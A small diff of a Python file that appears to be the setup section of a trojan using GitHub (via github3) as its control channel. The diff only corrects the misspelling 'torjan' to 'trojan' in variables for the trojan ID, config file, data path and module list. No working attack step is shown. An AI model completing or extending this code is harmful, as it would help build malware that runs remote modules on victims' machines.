@@ -10,9 +10,9 @@ import os
 
 from github3 import login
 
-torjan_id = "abc"
+trojan_id = "abc"
 
-torjan_coding = "%s,json" % trojan_id
+trojan_coding = "%s,json" % trojan_id
 data_path     = "data/%s/" % trojan_id
 trojan_modules= []
 cconfigures   = False
